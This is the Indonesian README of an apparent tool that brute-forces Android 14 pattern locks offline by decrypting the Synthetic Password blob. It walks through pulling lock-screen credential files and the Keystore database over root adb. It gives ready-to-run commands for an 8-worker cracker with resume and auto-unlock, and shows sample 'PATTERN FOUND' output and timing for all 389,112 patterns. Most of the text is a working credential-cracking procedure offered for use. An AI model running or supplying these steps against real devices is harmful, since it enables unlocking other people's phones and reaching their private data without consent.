# Android 14 Pattern Brute-Force via SP Blob Decryption

Tool untuk brute-force **pattern (gesture) lock** Android 14 secara **offline** dengan mendekripsi Synthetic Password Blob (`.spblob`). Tanpa throttle, tanpa rate-limit.

---

## Arsitektur Keamanan Android 14

Android 14 mengkonversi pattern lock (grid 3×3, dot 1-9) menjadi string numerik, lalu memprosesnya melalui pipeline kriptografi yang sama dengan PIN:

```
Pattern "15963" (1→5→9→6→3)
    │
    ▼ scrypt(N=2048, r=8, p=2, salt dari .pwd)
stretchedLskf (32B)
    │
    │  + secdiscardable_hash (SHA512 dari .secdis, 16KB)
    ▼
protectorSecret (96B)
    │
    ▼ SHA512(pad128("application-id") || protectorSecret)
inner AES key (32B)
    │
    ├── decrypt outer layer spblob (Keystore key dari persistent.sqlite)
    │
    ▼
    decrypt inner layer ──► ✅ Authentication tag match = pattern benar
                           ❌ Tag mismatch = pattern salah
```

---

## Pattern Grid (3×3)

```
1  2  3
4  5  6
7  8  9
```

**Aturan valid pattern:**
- Minimal 4 titik terhubung
- Tidak boleh mengunjungi ulang titik yang sama
- Tidak boleh melompati titik tengah yang belum dikunjungi

**Contoh invalid:** 1→3 (harus lewat 2), 1→9 (harus lewat 5), 7→9 (harus lewat 8)

**Contoh valid:** 1→6 (knight move), 1→8 (tidak ada titik di tengah), 1→5→9→6→3

| Panjang Pattern | Kombinasi Valid |
|---|---|
| 4 dots | 1,624 |
| 5 dots | 7,152 |
| 6 dots | 26,016 |
| 7 dots | 72,912 |
| 8 dots | 140,704 |
| 9 dots | 140,704 |
| **Total** | **389,112** |

---

## File Penting di Device

| File | Lokasi | Fungsi |
|---|---|---|
| `*.pwd` | `/data/system_de/0/spblob/` | Salt + scrypt parameters |
| `*.spblob` | `/data/system_de/0/spblob/` | Target brute-force (encrypted) |
| `*.secdis` | `/data/system_de/0/spblob/` | Secdiscardable (16KB random) |
| `persistent.sqlite` | `/data/misc/keystore/` | Keystore AES key (outer layer) |

> `*` = Protector ID (16-char hex), bisa dilihat dari `dumpsys lock_settings`

---

## Langkah 1: Siapkan Emulator/Device

```bash
adb root
adb shell dumpsys lock_settings | grep -E "CredentialType|protector ID"
# Output: CredentialType: Pattern
#         LSKF-based SP protector ID: 127c801dd428770a
```

---

## Langkah 2: Ekstrak Parameter

```bash
# Mode otomatis (ADB)
python3 extract_params.py --adb --output params.json

# Mode manual
adb pull /data/system_de/0/spblob/<ID>.pwd    spblob_data/
adb pull /data/system_de/0/spblob/<ID>.spblob spblob_data/
adb pull /data/system_de/0/spblob/<ID>.secdis spblob_data/
adb pull /data/misc/keystore/persistent.sqlite  spblob_data/

python3 extract_params.py \
  --pwd spblob_data/<ID>.pwd \
  --spblob spblob_data/<ID>.spblob \
  --secdis spblob_data/<ID>.secdis \
  --keystore-db spblob_data/persistent.sqlite \
  --protector-id <ID> \
  --output params.json
```

---

## Langkah 3: Jalankan Brute-Force

### Semua panjang pattern (4-9 dots)
```bash
python3 pattern_brute.py --params params.json -L 4 -M 9 -w 8
```

### Hanya 5-dot pattern (jika Anda tahu panjangnya)
```bash
python3 pattern_brute.py --params params.json -L 5 -M 5 -w 8
```

### Lihat statistik pattern space
```bash
python3 pattern_brute.py --params params.json --info
```

### Resume dari checkpoint
```bash
python3 pattern_brute.py --params params.json -L 4 -M 9 --resume
```

### Brute-force + auto-unlock (pattern langsung digambar di device)
```bash
pip install uiautomator2  # optional — hanya untuk auto-unlock
python3 pattern_brute.py --params params.json -L 7 -M 7 -w 16 --auto-unlock
```

### Benchmark + analisis GPU
```bash
python3 pattern_brute.py --params params.json --engine bench
```

**Output saat pattern ditemukan:**
```
[*] Brute-forcing 5-dot patterns (7,152 combinations)...
      1,500/7,152 (21%) rate=115/s ETA=0.8m

============================================================
 PATTERN FOUND: 15963
    Dots:       5 points
    Sequence:   1 -> 5 -> 9 -> 6 -> 3
    Time:       13s (0.2m)
============================================================
```

---

## Performa

| Panjang Pattern | Kombinasi | Workers | Waktu (est.) |
|---|---|---|---|
| 4 dots | 1,624 | 8 | ~15 detik |
| 5 dots | 7,152 | 8 | ~1 menit |
| 6 dots | 26,016 | 8 | ~4 menit |
| 7 dots | 72,912 | 8 | ~11 menit |
| 8 dots | 140,704 | 8 | ~21 menit |
| 9 dots | 140,704 | 8 | ~21 menit |
| **Total** | **389,112** | 8 | **~55-65 menit** |

> **Rate:** ~100-120 pattern/detik (CPU multi-core, scrypt N=2048).
> Dengan `--auto-unlock`, device langsung terbuka begitu pattern ditemukan (via `uiautomator2`).

## Flag Penting

| Flag | Fungsi |
|---|---|
| `-L N -M N` | Range panjang pattern |
| `-w N` | Jumlah worker CPU |
| `--start N` | Skip N pattern pertama |
| `--resume` | Lanjut dari checkpoint |
| `--auto-unlock` | Otomatis gambar pattern di device saat ditemukan |
| `--device SERIAL` | Target device untuk auto-unlock |
| `--engine bench` | Benchmark + analisis GPU |
| `--info` | Tampilkan statistik pattern space |

---

## Catatan GPU

scrypt dengan N=2048 didesain **memory-hard** secara spesifik untuk menangkal akselerasi GPU/ASIC/FPGA. GPU **tidak membantu** untuk workload ini. Multiprocessing CPU adalah pendekatan optimal.

---

## Struktur Project

```
pattern-unlocker/
├── extract_params.py       # Auto-ekstrak parameter dari 4 file + Keystore DB
├── pattern_brute.py        # Brute-force engine + pattern generator + auto-unlock + GPU analysis
├── SKILL.md                # Dokumentasi self-contained (copy-paste ready)
├── README.md               # Dokumentasi ini
├── params.json             # Parameter hasil ekstraksi
└── spblob_data/            # Sample files dari device (opsional)
```

## Requirements

```bash
pip install cryptography
pip install uiautomator2  # optional — hanya untuk fitur --auto-unlock
```

- Python 3.8+
- ADB (untuk ekstraksi dari device)
- Device/emulator Android 14 rooted
- `uiautomator2` (opsional, untuk auto-unlock)

## License

MIT
